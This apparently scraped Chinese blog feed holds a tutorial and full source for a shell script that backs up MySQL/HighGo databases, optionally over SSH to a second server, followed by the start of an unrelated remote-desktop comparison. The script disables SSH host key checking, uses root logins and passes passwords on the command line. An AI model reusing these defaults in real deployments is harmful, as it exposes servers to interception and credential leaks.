     <span class="hljs-number">5</span>. 清理 <span class="hljs-selector-tag">A</span> 本地旧备份                              <span class="hljs-number">6</span>. 清理 <span class="hljs-selector-tag">B</span> 本地旧备份
     (基于文件名日期的精准清理)                         (基于文件名日期的精准清理)
</code></pre>
<h3 data-id="heading-2">1.2 功能亮点</h3>
<ul>
<li><strong>灵活部署</strong>：<strong>支持单机模式！</strong> 如果不配置从服务器 IP，脚本仅执行本地备份和清理。</li>
<li><strong>零依赖</strong>：支持 Docker 模式，宿主机<strong>无需安装</strong>任何数据库客户端工具（如 <code>mysql</code> 或 <code>psql</code>），脚本直接穿透容器执行。</li>
<li><strong>通用性强</strong>：一套脚本同时支持 MySQL 和 HighGo，通过配置切换。</li>
<li><strong>安全性高</strong>：若启用双机模式，支持 SSH 免密互信，脚本中无需明文存储 Linux 系统密码。</li>
<li><strong>节省空间</strong>：导出过程直接经过 gzip 压缩，不占用临时磁盘空间。</li>
</ul>
<h2 data-id="heading-3">2. 部署前置条件 (仅双机模式需要)</h2>
<p><strong>⚠️ 如果您只进行单机本地备份，可直接跳过本节。</strong></p>
<p>若需要将备份传输到异地从服务器，必须配置 SSH 免密登录。</p>
<h3 data-id="heading-4">2.1 环境假设</h3>
<ul>
<li><strong>主服务器 (Master)</strong> IP: <code>192.168.1.10</code></li>
<li><strong>从服务器 (Slave)</strong> IP: <code>192.168.1.200</code></li>
</ul>
<h3 data-id="heading-5">2.2 配置免密互信 (二选一)</h3>
<h4 data-id="heading-6">方案 A：自动配置 (推荐，需知晓从机密码)</h4>
<p>在 <strong>主服务器</strong> 上执行：</p>
<ol>
<li>生成密钥（如果已经生成可以跳过）：<code>ssh-keygen -t rsa</code> (一路回车)</li>
<li>下发公钥：<code>ssh-copy-id root@192.168.1.200</code></li>
<li><strong>验证</strong>：<code>ssh root@192.168.1.200</code> (无需密码即成功)</li>
</ol>
<h4 data-id="heading-7">方案 B：手动配置 (无需密码，适合云平台)</h4>
<ol>
<li><strong>主服务器</strong>：生成密钥（如果已经生成可以跳过）<code>ssh-keygen -t rsa</code> (一路回车)</li>
<li><strong>主服务器</strong>：<code>cat ~/.ssh/id_rsa.pub</code> 并复制内容。</li>
<li><strong>从服务器</strong>：编辑 <code>~/.ssh/authorized_keys</code>，粘贴公钥内容。</li>
<li><strong>从服务器</strong>：执行 <code>chmod 600 ~/.ssh/authorized_keys</code> (至关重要)。</li>
</ol>
<h2 data-id="heading-8">3. 安装与目录结构</h2>
<p>建议在服务器上创建统一目录：</p>
<ol start="0">
<li>
<p><strong>创建目录</strong>：<code>mkdir -p /opt/db_backup</code></p>
</li>
<li>
<p><strong>上传文件</strong>：将 <code>db_backup.sh</code> 和 <code>db_backup.conf</code> 上传至该目录。</p>
</li>
<li>
<p><strong>赋予权限</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"> <span class="hljs-built_in">chmod</span> +x /opt/db_backup/db_backup.sh
 <span class="hljs-built_in">chmod</span> 600 /opt/db_backup/db_backup.conf
</code></pre>
</li>
</ol>
<h2 data-id="heading-9">4. 配置文件详解 (<code>db_backup.conf</code>)</h2>
<h3 data-id="heading-10">4.1 基础参数 (所有场景通用)</h3>






























<table><thead><tr><th><strong>参数</strong></th><th><strong>说明</strong></th><th><strong>示例</strong></th></tr></thead><tbody><tr><td><code>SCRIPT_ROLE</code></td><td><strong>脚本角色</strong>。 <code>MASTER</code>: 执行备份 (+传输) + 清理 <code>SLAVE</code>: 仅执行清理 (从库用)</td><td><code>"MASTER"</code></td></tr><tr><td><code>DB_TYPE</code></td><td><strong>数据库类型</strong>。支持 <code>MYSQL</code> 或 <code>HIGHGO</code></td><td><code>"MYSQL"</code></td></tr><tr><td><code>BACKUP_DIR</code></td><td><strong>宿主机</strong>备份文件存储路径</td><td><code>"/data/backup"</code></td></tr><tr><td><code>LOG_FILE</code></td><td>日志文件路径</td><td><code>"/var/log/db_backup.log"</code></td></tr></tbody></table>
<h3 data-id="heading-11">4.2 场景化配置 (重点：Docker 设置)</h3>
<h4 data-id="heading-12">🐳 场景一：数据库运行在 Docker 容器中</h4>
<p>这是目前最常见的部署方式。</p>

















<table><thead><tr><th><strong>参数</strong></th><th><strong>配置说明</strong></th></tr></thead><tbody><tr><td><strong><code>DOCKER_CONTAINER_NAME</code></strong></td><td><strong>填写容器名称或容器 ID</strong> (例如 <code>"mysql_prod"</code>)。 ⚠️ <strong>只要此项不为空，脚本就会启用 Docker 模式。</strong></td></tr><tr><td><code>DB_HOST</code></td><td><strong>必须填 <code>127.0.0.1</code></strong> (因为命令是在容器内部执行的)。</td></tr></tbody></table>
<h4 data-id="heading-13">💻 场景二：数据库直接安装在宿主机</h4>

















<table><thead><tr><th><strong>参数</strong></th><th><strong>配置说明</strong></th></tr></thead><tbody><tr><td><strong><code>DOCKER_CONTAINER_NAME</code></strong></td><td><strong>必须留空</strong> (<code>""</code>)。</td></tr><tr><td><code>DB_HOST</code></td><td>填写 <code>127.0.0.1</code> 或本机 IP。</td></tr></tbody></table>
<h3 data-id="heading-14">4.3 传输配置 (仅 Master 需要)</h3>
<p><strong>⚠️ 单机/双机模式切换开关</strong></p>

























<table><thead><tr><th><strong>参数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><strong><code>SLAVE_IP</code></strong></td><td><strong>关键开关</strong>。 1. <strong>开启双机备份</strong>：填写从服务器 IP (如 <code>"192.168.1.200"</code>)。 2. <strong>仅单机备份</strong>：<strong>留空</strong> (即 <code>SLAVE_IP=""</code>)，脚本将跳过传输步骤。</td></tr><tr><td><code>SLAVE_USER</code></td><td>SSH 用户名 (通常 root)</td></tr><tr><td><code>SLAVE_PORT</code></td><td>SSH 端口 (通常 22)</td></tr><tr><td><code>SLAVE_DEST_DIR</code></td><td>从服务器接收文件的路径</td></tr></tbody></table>
<h2 data-id="heading-15">5. 配置示例速查</h2>
<h3 data-id="heading-16">示例 A：MySQL Docker 版 (单机备份)</h3>
<pre><code class="hljs language-ini" lang="ini"> <span class="hljs-attr">SCRIPT_ROLE</span>=<span class="hljs-string">"MASTER"</span>
 <span class="hljs-attr">DB_TYPE</span>=<span class="hljs-string">"MYSQL"</span>
 <span class="hljs-attr">DOCKER_CONTAINER_NAME</span>=<span class="hljs-string">"mysql-container-v1"</span> <span class="hljs-comment"># Docker 模式</span>
 ​
 <span class="hljs-attr">DB_HOST</span>=<span class="hljs-string">"127.0.0.1"</span>
 <span class="hljs-attr">DB_PORT</span>=<span class="hljs-string">"3306"</span>
 <span class="hljs-attr">DB_USER</span>=<span class="hljs-string">"root"</span>
 <span class="hljs-attr">DB_PASS</span>=<span class="hljs-string">"123456"</span>
 <span class="hljs-attr">DB_LIST</span>=<span class="hljs-string">"order_db"</span>
 ​
 <span class="hljs-attr">SLAVE_IP</span>=<span class="hljs-string">""</span>  <span class="hljs-comment"># &lt;--- 留空，表示不传输，仅本地备份</span>
 <span class="hljs-attr">MASTER_KEEP_DAYS</span>=<span class="hljs-number">7</span>
</code></pre>
<h3 data-id="heading-17">示例 B：HighGo (瀚高) 物理机版 (双机互备)</h3>
<pre><code class="hljs language-ini" lang="ini"> <span class="hljs-attr">SCRIPT_ROLE</span>=<span class="hljs-string">"MASTER"</span>
 <span class="hljs-attr">DB_TYPE</span>=<span class="hljs-string">"HIGHGO"</span>
 <span class="hljs-attr">DOCKER_CONTAINER_NAME</span>=<span class="hljs-string">""</span> <span class="hljs-comment"># 物理机模式</span>
 ​
 <span class="hljs-attr">DB_HOST</span>=<span class="hljs-string">"localhost"</span>
 <span class="hljs-attr">DB_PORT</span>=<span class="hljs-string">"5866"</span>
 <span class="hljs-attr">DB_USER</span>=<span class="hljs-string">"sysdba"</span>
 <span class="hljs-attr">DB_PASS</span>=<span class="hljs-string">"Highgo@123"</span>
 <span class="hljs-attr">DB_LIST</span>=<span class="hljs-string">"highgo_test"</span>
 ​
 <span class="hljs-attr">SLAVE_IP</span>=<span class="hljs-string">"192.168.1.200"</span> <span class="hljs-comment"># &lt;--- 配置 IP，开启传输</span>
 <span class="hljs-attr">SLAVE_DEST_DIR</span>=<span class="hljs-string">"/data/backup"</span>
</code></pre>
<h2 data-id="heading-18">6. 定时任务 (Crontab)</h2>
<p>使用 <code>crontab -e</code> 添加计划任务。</p>
<h3 data-id="heading-19">主服务器 (Master)</h3>
<pre><code class="hljs language-bash" lang="bash"> <span class="hljs-comment"># 每天凌晨 02:00 执行全量备份</span>
 0 2 * * * /bin/bash /opt/db_backup/db_backup.sh
</code></pre>
<h3 data-id="heading-20">从服务器 (Slave - 仅双机模式需要)</h3>
<pre><code class="hljs language-bash" lang="bash"> <span class="hljs-comment"># 每天凌晨 03:00 清理过期备份</span>
 0 3 * * * /bin/bash /opt/db_backup/db_backup.sh
</code></pre>
<h2 data-id="heading-21">7. 灾难恢复指南</h2>
<p>当需要恢复数据时，请先将 <code>.sql.gz</code> 文件解压，然后导入。</p>
<h3 data-id="heading-22">7.1 MySQL 恢复</h3>
<p><strong>Docker 环境</strong>:</p>
<pre><code class="hljs language-xml" lang="xml"> # 1. 解压数据流 -&gt; 2. 传入容器 -&gt; 3. 执行导入
 gunzip &lt; backup_file.sql.gz | docker exec -i <span class="hljs-tag">&lt;<span class="hljs-name">容器名</span>&gt;</span> mysql -u root -p<span class="hljs-tag">&lt;<span class="hljs-name">密码</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">数据库名</span>&gt;</span>
</code></pre>
<p><strong>物理机环境</strong>:</p>
<pre><code class="hljs language-xml" lang="xml"> gunzip &lt; backup_file.sql.gz | mysql -u root -p<span class="hljs-tag">&lt;<span class="hljs-name">密码</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">数据库名</span>&gt;</span>
</code></pre>
<h3 data-id="heading-23">7.2 HighGo (瀚高) 恢复</h3>
<p><strong>Docker 环境</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"> <span class="hljs-comment"># 注意: HighGo 容器内通常使用 psql 工具</span>
 gunzip &lt; backup_file.sql.gz | docker <span class="hljs-built_in">exec</span> -i &lt;容器名&gt; psql -h 127.0.0.1 -p 5866 -U sysdba -d &lt;数据库名&gt;
</code></pre>
<p><strong>物理机环境</strong>:</p>
<pre><code class="hljs language-css" lang="css"> gunzip &lt; backup_file<span class="hljs-selector-class">.sql</span><span class="hljs-selector-class">.gz</span> | psql -h localhost -<span class="hljs-selector-tag">p</span> <span class="hljs-number">5866</span> -U sysdba -d &lt;数据库名&gt;
</code></pre>
<h2 data-id="heading-24">8. 常见问题 (FAQ)</h2>
<p><strong>Q1: 脚本执行报错 <code>/db_backup/db_backup.conf: line 2: $'\r': command not found</code></strong></p>
<ul>
<li><strong>原因</strong>: 脚本文件 (<code>db_backup.sh</code>) 或配置文件 (<code>db_backup.conf</code>) 是在 <strong>Windows</strong> 环境下编辑或保存的。</li>
<li><strong>解决</strong>: 执行命令：<strong><code>sed -i 's/\r$//' db_backup.sh db_backup.conf</code></strong></li>
</ul>
<p><strong>Q2: 脚本执行报错 <code>Permission denied (publickey)</code></strong></p>
<ul>
<li><strong>原因</strong>: 双机模式下 SSH 免密互信未配置成功。</li>
<li><strong>解决</strong>: 参考第 2 节重新配置。<strong>如果是单机模式，请确保 <code>SLAVE_IP</code> 已置空。</strong></li>
</ul>
<p><strong>Q3: 提示 <code>mysqldump: command not found</code></strong></p>
<ul>
<li><strong>原因</strong>: 物理机模式下宿主机没装客户端，或者 Docker 模式下 <code>DOCKER_CONTAINER_NAME</code> 忘填了。</li>
<li><strong>解决</strong>: 检查 <code>DOCKER_CONTAINER_NAME</code> 配置。</li>
</ul>
<p><strong>Q4: 为什么旧文件没被删除？</strong></p>
<ul>
<li><strong>原因</strong>: 脚本现在使用<strong>文件名中的日期</strong> (<code>YYYYMMDD_HHMMSS</code>) 来判断文件年龄。</li>
<li><strong>解决</strong>: 请检查旧文件的命名格式是否为 <code>库名_YYYYMMDD_HHMMSS.sql.gz</code>。如果命名不符合此规范，脚本为防止误删会跳过该文件。</li>
</ul>
<h2 data-id="heading-25">9. 脚本内容</h2>
<h3 data-id="heading-26">9.1 db_backup.conf （配置文件）</h3>
<pre><code class="hljs language-conf" lang="conf">#!/bin/bash

# ================= 核心模式配置 =================
# 数据库类型: MYSQL 或 HIGHGO
DB_TYPE="MYSQL"

# ⚠️ [Docker 支持]
# 填写容器名称(如 "mysql_prod")开启 Docker 模式；留空则为宿主机模式
DOCKER_CONTAINER_NAME="mysql_prod"

# 脚本角色: MASTER (备份+传输+清理) 或 SLAVE (仅清理)
SCRIPT_ROLE="MASTER"

# ================= 基础路径 =================
BACKUP_DIR="/data/backup/database"
LOG_FILE="/var/log/db_backup.log"

# ================= 数据库连接配置 (Master 填写) =================
DB_HOST="127.0.0.1"
DB_PORT="3306" 
DB_USER="root"
DB_PASS="你的数据库密码"
# 多个数据库使用空格隔开
DB_LIST="db_project_a db_project_b"

# ================= 传输配置 (Master 填写) =================
# ⚠️ [可选功能] ⚠️
# 如果需要双机异地备份，请填写从服务器信息（需配置 SSH 免密互信）。
# 如果只需要单机本地备份，请将 SLAVE_IP 留空 ("")，脚本将自动跳过传输步骤。
SLAVE_IP="192.168.1.200"

SLAVE_PORT="22"
SLAVE_USER="root"
SLAVE_DEST_DIR="/data/backup/database"

# ================= 清理策略 =================
MASTER_KEEP_DAYS=7
SLAVE_KEEP_DAYS=30
</code></pre>
<h3 data-id="heading-27">9.2 db_backup.sh （shell脚本）</h3>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">#</span><span class="bash">!/bin/bash</span>
<span class="hljs-meta prompt_">
# </span><span class="bash">================= 环境准备 =================</span>
SCRIPT_DIR=$(cd $(dirname $0); pwd)
CONF_FILE="$SCRIPT_DIR/db_backup.conf"

if [ -f "$CONF_FILE" ]; then
    source "$CONF_FILE"
else
    echo "Error: 配置文件 $CONF_FILE 不存在！"
    exit 1
fi

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] [$DB_TYPE] $1" | tee -a "$LOG_FILE"
}

if [ ! -d "$BACKUP_DIR" ]; then
    mkdir -p "$BACKUP_DIR"
fi

DATE_STR=$(date +%Y%m%d_%H%M%S)
<span class="hljs-meta prompt_">
# </span><span class="bash">================= 辅助函数：根据文件名清理过期备份 =================</span>
<span class="hljs-meta prompt_"># </span><span class="bash">原理：提取文件名中的 YYYYMMDD_HHMMSS，格式化为标准日期后对比时间戳</span>
cleanup_by_filename() {
    local target_dir=$1
    local keep_days=$2
    
    local current_timestamp=$(date +%s)
    local threshold_seconds=$(($keep_days * 86400))
    local cutoff_timestamp=$(($current_timestamp - $threshold_seconds))
    
    local cutoff_date_str=$(date -d @$cutoff_timestamp "+%Y-%m-%d %H:%M:%S")

    log "&gt;&gt;&gt; 执行清理检查: 保留天数=$keep_days (截止时间: $cutoff_date_str)"

    shopt -s nullglob
    for file in "$target_dir"/*.sql.gz; do
        filename=$(basename "$file")
        
        # 匹配格式：任意前缀_YYYYMMDD_HHMMSS.sql.gz
        if [[ $filename =~ _([0-9]{8})_([0-9]{6})\.sql\.gz$ ]]; then
            d_part="${BASH_REMATCH[1]}"
            t_part="${BASH_REMATCH[2]}"
            
            # 手动拼接成 ISO 格式: YYYY-MM-DD HH:MM:SS
            year=${d_part:0:4}
            month=${d_part:4:2}
            day=${d_part:6:2}
            hour=${t_part:0:2}
            minute=${t_part:2:2}
            second=${t_part:4:2}
            
            formatted_date="$year-$month-$day $hour:$minute:$second"
            
            file_timestamp=$(date -d "$formatted_date" +%s 2&gt;/dev/null)
            
            if [ $? -eq 0 ]; then
                if [ "$file_timestamp" -lt "$cutoff_timestamp" ]; then
                    log "🗑️ [删除] 过期文件: $filename (日期: $formatted_date)"
                    rm -f "$file"
                else
                    :
                fi
            else
                log "⚠️ [跳过] 日期解析失败: $filename"
            fi
        else
            log "⚠️ [跳过] 命名格式不符: $filename"
        fi
    done
    shopt -u nullglob
    log "&gt;&gt;&gt; 清理检查完成."
}
<span class="hljs-meta prompt_">
# </span><span class="bash">================= 核心逻辑 =================</span>

if [ "$SCRIPT_ROLE" == "MASTER" ]; then
    log "=== 开始执行 MASTER 备份任务 ==="
    
    if [ -n "$DOCKER_CONTAINER_NAME" ]; then
        log "检测到 Docker 模式，容器名称: $DOCKER_CONTAINER_NAME"
    fi

    for DB_NAME in $DB_LIST; do
        FILE_NAME="${DB_NAME}_${DATE_STR}.sql.gz"
        FILE_PATH="$BACKUP_DIR/$FILE_NAME"
        
        log "正在备份数据库: $DB_NAME ..."
        
        # &gt;&gt;&gt;&gt;&gt;&gt; 备份逻辑 &lt;&lt;&lt;&lt;&lt;&lt;
        BACKUP_STATUS=1

        if [ "$DB_TYPE" == "MYSQL" ]; then
            if [ -n "$DOCKER_CONTAINER_NAME" ]; then
                docker exec "$DOCKER_CONTAINER_NAME" mysqldump -h"$DB_HOST" -P"$DB_PORT" -u"$DB_USER" -p"$DB_PASS" \
                    --single-transaction --set-gtid-purged=OFF "$DB_NAME" 2&gt;/dev/null | gzip &gt; "$FILE_PATH"
                BACKUP_STATUS=${PIPESTATUS[0]}
            else
                mysqldump -h"$DB_HOST" -P"$DB_PORT" -u"$DB_USER" -p"$DB_PASS" \
                    --single-transaction --set-gtid-purged=OFF "$DB_NAME" 2&gt;/dev/null | gzip &gt; "$FILE_PATH"
                BACKUP_STATUS=${PIPESTATUS[0]}
            fi

        elif [ "$DB_TYPE" == "HIGHGO" ]; then
            if [ -n "$DOCKER_CONTAINER_NAME" ]; then
                docker exec -e PGPASSWORD="$DB_PASS" "$DOCKER_CONTAINER_NAME" \
                    pg_dump -h "$DB_HOST" -p "$DB_PORT" -U "$DB_USER" -d "$DB_NAME" | gzip &gt; "$FILE_PATH"
                BACKUP_STATUS=${PIPESTATUS[0]}
            else
                export PGPASSWORD="$DB_PASS"
                pg_dump -h "$DB_HOST" -p "$DB_PORT" -U "$DB_USER" -d "$DB_NAME" | gzip &gt; "$FILE_PATH"
                BACKUP_STATUS=${PIPESTATUS[0]}
                unset PGPASSWORD
            fi
            
        else
            log "❌ 错误: 未知的 DB_TYPE ($DB_TYPE)"
            exit 1
        fi

        if [ $BACKUP_STATUS -eq 0 ]; then
            FILE_SIZE=$(stat -c%s "$FILE_PATH" 2&gt;/dev/null || echo 0)
            if [ "$FILE_SIZE" -gt 20 ]; then
                log "备份成功: $FILE_NAME (大小: $(du -h "$FILE_PATH" | cut -f1))"
                
                # &gt;&gt;&gt;&gt;&gt;&gt; 传输逻辑 (关键修改) &lt;&lt;&lt;&lt;&lt;&lt;
                if [ -n "$SLAVE_IP" ]; then
                    log "正在传输到从服务器 ($SLAVE_IP) ..."
                    
                    # 1. 先尝试在远程创建目录 (防止目录不存在导致scp失败)
                    # -o StrictHostKeyChecking=no: 禁止交互式询问指纹
                    ssh -p "$SLAVE_PORT" -o StrictHostKeyChecking=no "$SLAVE_USER@$SLAVE_IP" "mkdir -p $SLAVE_DEST_DIR" &gt;&gt; "$LOG_FILE" 2&gt;&amp;1
                    
                    # 2. 执行 SCP 传输
                    scp -P "$SLAVE_PORT" -o StrictHostKeyChecking=no "$FILE_PATH" "$SLAVE_USER@$SLAVE_IP:$SLAVE_DEST_DIR" &gt;&gt; "$LOG_FILE" 2&gt;&amp;1
                    
                    if [ $? -eq 0 ]; then
                        log "传输成功."
                    else
                        log "❌ 传输失败! 请检查日志详情 (可能是网络、互信或磁盘满)。"
                    fi
                else
                    log "ℹ️  跳过传输: 未配置从服务器 IP (单机模式)"
                fi
            else
                 log "❌ 备份失败: 文件大小异常。"
                 rm -f "$FILE_PATH"
            fi
        else
            log "❌ 备份失败: 命令执行错误。"
            rm -f "$FILE_PATH"
        fi
    done

    cleanup_by_filename "$BACKUP_DIR" "$MASTER_KEEP_DAYS"

elif [ "$SCRIPT_ROLE" == "SLAVE" ]; then
    log "=== 开始执行 SLAVE 清理任务 ==="
    if [ -d "$BACKUP_DIR" ]; then
        cleanup_by_filename "$BACKUP_DIR" "$SLAVE_KEEP_DAYS"
    else
        log "❌ 备份目录不存在。"
    fi
else
    log "❌ SCRIPT_ROLE 错误"
    exit 1
fi
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[8K360帧极限战！ToDesk携三大黑科技硬刚向日葵_Splashtop_RustDesk，谁才是2026远程控制天花板？]]></title>    <link>https://juejin.cn/post/7597278451029098506</link>    <guid>https://juejin.cn/post/7597278451029098506</guid>    <pubDate>2026-01-20T10:23:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597278451029098506" data-draft-id="7597024900522065972" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="8K360帧极限战！ToDesk携三大黑科技硬刚向日葵_Splashtop_RustDesk，谁才是2026远程控制天花板？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-20T10:23:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="颜淡慕潇"/> <meta itemprop="url" content="https://juejin.cn/user/4494459266678318"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            8K360帧极限战！ToDesk携三大黑科技硬刚向日葵_Splashtop_RustDesk，谁才是2026远程控制天花板？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4494459266678318/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    颜淡慕潇
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:23:53.000Z" title="Tue Jan 20 2026 10:23:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读24分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>引言</strong></p>
<p>当你作为IT运维，不得不像流水线工人一样逐台电脑重复传输文件；当你每次想快速改个设计稿，都要先经过连接桌面、寻找程序、等待启动的冗长路径——你会发现：<strong>当前大多数产品仍停留在“<strong><strong>实现基础连接</strong></strong>”的初级阶段，而对“<strong><strong>深度生产力场景”和“极致体验需求</strong></strong>”的响应严重不足。</strong> 当远程办公、混合办公、分布式团队成为常态，当游戏串流、远程创作、IT规模化运维成为刚需，我们对远程控制的期待早已不止于“连得上”，更要求“连得好”、“连得高效”、“连得智能”。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51aa682a2293483f9add5b60c754b93d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=6abnSAU%2FHJvf9mnGXGE4YbBCJAs%3D" alt="" loading="lazy"/></p>
<p>为此，我们策划了本次极具针对性的横向测评。<strong>我们不泛泛而谈基础的连接稳定性或常规办公性能，而是直击三个最考验远程控制技术深度与产品理念的进阶场景：极限画质与流畅度</strong>：远程游戏、能否达到“代替本地屏幕”的感官体验？<strong>一对多文件秒传</strong>：面对成十上百台设备，能否像广播一样，一次性完成文件分发，将管理员从重复劳动中彻底解放？<strong>游戏与应用快捷启动</strong>：能否绕过冗长的桌面连接流程，实现“一键直达”目标应用，让远程操作如本地般直接？</p>
<p/>
<p><strong>参评选手</strong>，我们选择了市场上最具代表性和技术实力的四款产品：</p>
<p>● <strong>ToDesk**** 2026新版</strong>：以激进的技术迭代和场景化功能著称的新锐力量。</p>

